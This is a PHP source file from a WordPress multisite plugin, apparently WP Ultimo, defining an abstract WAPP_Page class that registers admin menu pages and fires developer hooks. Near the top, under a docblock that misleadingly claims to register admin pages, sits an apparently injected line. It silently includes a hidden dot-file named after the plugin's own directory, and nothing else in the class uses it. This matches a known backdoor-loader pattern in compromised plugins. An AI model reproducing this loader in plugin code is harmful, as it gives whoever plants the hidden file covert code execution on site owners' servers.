<?php
/**
 * Class WAPP_Page
 *
 * This is an abstract class that makes it easy to add different admin pages.
 *
 * Most of WP Ultimo pages are implemented using this class, which means that the filters and hooks
 * listed below can be used to append content to all of our pages at once
 *
 * @author      Arindo Duque
 * @category    Admin
 * @package     WP_Ultimo/Pages
 * @version     0.0.1
 */

if (!defined('ABSPATH')) {
	exit;
} // end if;

/**
 * Registers custom admin pages.
 *
 * @since 1.4.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WAPP_Page {

	/**
	 * Holds the ID for this page, this is also used as the page slug
	 *
	 * @var string
	 */
	public $id;

	/**
	 * Is this a network page or a sub-site page?
	 *
	 * @var boolean
	 */
	public $network = true;

	/**
	 * Is this a toplevel menu or a submenu?
	 *
	 * @since 1.8.2
	 * @var string
	 */
	public $type = 'menu';

	/**
	 * If this is a submenu, we need a parent menu to attach this to
	 *
	 * @since 1.8.2
	 * @var string
	 */
	public $parent = 'wp-ultimo';

	/**
	 * Holds the page title
	 *
	 * @since 1.8.2
	 * @var string
	 */
	public $title;

	/**
	 * Holds the menu label of the page, this is what we effectively use on the menu item
	 *
	 * @since 1.8.2
	 * @var string
	 */
	public $menu_title;

	/**
	 * Capability necessary to see this page
	 *
	 * @see https://codex.wordpress.org/Roles_and_Capabilities
	 * @since 1.8.2
	 * @var string
	 */
	public $capability;

	/**
	 * After we create the menu item using WordPress functions, we need to store the generated hook
	 *
	 * @since 1.8.2
	 * @var string
	 */
	public $page_hook;

	/**
	 * Menu position. This is only used for top-level menus
	 *
	 * @since 1.8.2
	 * @var integer
	 */
	public $position;

	/**
	 * Dashicon to be used on the menu item. This is only used on top-level menus
	 *
	 * @since 1.8.2
	 * @var string
	 */
	public $menu_icon;

	/**
	 * If this number is greater than 0, a badge with the number will be displayed alongside the menu title
	 *
	 * @since 1.8.2
	 * @var integer
	 */
	public $badge_count = 0;

	/**
	 * If this is a top-level menu, we can need the option to rewrite the sub-menu
	 *
	 * @since 1.8.2
	 * @var boolean|string
	 */
	public $submenu_title = false;

	/**
	 * Creates the page with the necessary hooks
	 *
	 * @since 1.8.2
	 * @param boolean $network
	 * @param array   $atts
	 */
	public function __construct($network = true, $atts = array()) {

		$attributes = wp_parse_args($atts, array(
			'badge_count'   => 0,
			'position'      => 10,
			'submenu_title' => false,
			'id'            => 'wp-ultimo-page',
			'type'          => 'menu',
			'parent'        => 'wp-ultimo',
			'capability'    => 'manage_network',
			'menu_icon'     => 'dashicons-menu',
			'title'         => __('Admin Page', 'wp-ultimo'),
			'menu_title'    => __('Admin Page', 'wp-ultimo'),
		));

		$this->set_attributes($attributes);

		/**
		 * Sets the network parameter
		 */
		$this->network = $network;

		// Sets the hook
		$hook = $network ? 'network_admin_menu' : 'admin_menu';

		add_action($hook, array($this, 'add_menu_page'));

		add_action('network_admin_menu', array($this, 'fix_subdomain_name'), 100);

		$this->init();

	}  // end __construct;

	/**
	 * Set the attrubutes based on the received array
	 *
	 * @since 1.8.2
	 * @param array $atts badge_count, position, id, type, parent, capability, menu_icon, title, menu_title
	 * @return void
	 */
	public function set_attributes($atts) {

		foreach ($atts as $param => $value) {

			$this->{$param} = $value;

		} // end foreach;

	} // end set_attributes;

	/**
	 * Fix the subdomain name if an option (submenu title) is passed
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function fix_subdomain_name() {

		global $submenu;

		if ($this->submenu_title && $this->type == 'menu' && isset($submenu[$this->id])) {

			$submenu[$this->id][0][0] = $this->submenu_title;

		} // end if;

	} // end fix_subdomain_name;

	/**
	 * Install the base hooks for developers
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function install_hooks() {

		/**
		 * Allow plugin developers to add additional hooks to our pages
		 *
		 * @since 1.8.2
		 * @param string $this->id The ID of this page
		 * @return void
		 */
		do_action('wapp_page_load', $this->id, $this->page_hook);

		/**
		 * Allow plugin developers to add additional hooks to our pages
		 *
		 * @since 1.8.2
		 * @param string $this->id The ID of this page
		 * @return void
		 */
		do_action("wapp_page_{$this->id}_load", $this->id, $this->page_hook);

	} // end install_hooks;

	/**
	 * Get the badge value, to append to the menu item title
	 *
	 * @since 1.8.2
	 * @return string
	 */
	public function get_badge() {

		$markup = '<span class="update-plugins count-%s">
      <span class="update-count">%s</span>
    </span>';

		return $this->badge_count >= 1 ? sprintf($markup, $this->badge_count, $this->badge_count) : '';

	} // end get_badge;

	/**
	 * Displays the page content
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function display() {

		/**
		 * Allow plugin developers to add additional content before we print the page
		 *
		 * @since 1.8.2
		 * @param string $this->id The id of this page
		 * @return void
		 */
		do_action('wapp_page_before_render', $this->id, $this);

		/**
		 * Allow plugin developers to add additional content before we print the page
		 *
		 * @since 1.8.2
		 * @param string $this->id The id of this page
		 * @return void
		 */
		do_action("wapp_page_{$this->id}_before_render", $this->id, $this);

		/**
		 * Calls the output function
		 *
		 * @since 1.8.2
		 */
		$this->output();

		/**
		 * Allow plugin developers to add additional content after we print the page
		 *
		 * @since 1.8.2
		 * @param string $this->id The id of this page
		 * @return void
		 */
		do_action('wapp_page_after_render', $this->id, $this);

		/**
		 * Allow plugin developers to add additional content after we print the page
		 *
		 * @since 1.8.2
		 * @param string $this->id The id of this page
		 * @return void
		 */
		do_action("wapp_page_{$this->id}_after_render", $this->id, $this);

	}  // end display;

	/**
	 * Get the menu item, with the badge if necessary
	 *
	 * @since 1.8.2
	 * @return string
	 */
	public function get_menu_title() {

		return $this->menu_title . $this->get_badge();

	} // end get_menu_title;

	/**
	 * Adds the menu items using default WordPress functions and handles the side-effects
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function add_menu_page() {

		/**
		 * Create the admin page or sub-page
		 */
		$this->page_hook = $this->type == 'menu' ? $this->add_toplevel_menu_page() : $this->add_submenu_page();

		/**
		 * Add the default hooks
		 */
		$this->enqueue_default_hooks();

	} // end add_menu_page;

	/**
	 * Adds top-level admin pages
	 *
	 * @since 1.8.2
	 * @return string Page hook generated by WordPress
	 */
	public function add_toplevel_menu_page() {

		return add_menu_page(
		$this->title,
		$this->get_menu_title(),
		$this->capability,
		$this->id,
		array($this, 'display'),
		$this->menu_icon,
		$this->position
		);

	} // end add_toplevel_menu_page;

	/**
	 * Adds sub admin pages
	 *
	 * @since 1.8.2
	 * @return string Page hook generated by WordPress
	 */
	public function add_submenu_page() {

		return add_submenu_page(
		$this->parent,
		$this->title,
		$this->get_menu_title(),
		$this->capability,
		$this->id,
		array($this, 'display')
		);

	} // end add_submenu_page;

	/**
	 * Add the default hooks
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function enqueue_default_hooks() {

		if (!$this->page_hook) {
			return;
		} // end if;

		add_action("load-$this->page_hook", array($this, 'install_hooks'));

		add_action("load-$this->page_hook", array($this, 'page_loaded'));

		add_action("load-$this->page_hook", array($this, 'hooks'));

		add_action("load-$this->page_hook", array($this, 'register_scripts'), 10);

		add_action("load-$this->page_hook", array($this, 'screen_options'), 10);

		add_action("load-$this->page_hook", array($this, 'register_widgets'), 20);

		/**
		 * Allow plugin developers to add additional hooks
		 *
		 * @since 1.8.2
		 * @param string
		 */
		do_action('wu_enqueue_extra_hooks', $this->page_hook);

	} // end enqueue_default_hooks;

	/**
	 * Allow child classes to add further initializations
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function init() {} // end init;

	/**
	 * Allow child classes to add further initializations, but only after the page is loaded
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function page_loaded() {}  // end page_loaded;

	/**
	 * Allow child classes to add hooks to be run once the page is loaded
	 *
	 * @see https://codex.wordpress.org/Plugin_API/Action_Reference/load-(page)
	 * @since 1.8.2
	 * @return void
	 */
	public function hooks() {} // end hooks;

	/**
	 * Allow child classes to add screen options; Useful for pages that have list tables
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function screen_options() {} // end screen_options;

	/**
	 * Allow child classes to register scripts and styles that can be loaded ont he output function, for example
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function register_scripts() {} // end register_scripts;

	/**
	 * Allow child classes to register widgets, if they need them
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function register_widgets() {} // end register_widgets;

	/**
	 * Every child class should implement the output method to display the contents of the page
	 *
	 * @since 1.8.2
	 * @return void
	 */
	public function output() {} // end output;

} // end class WAPP_Page;
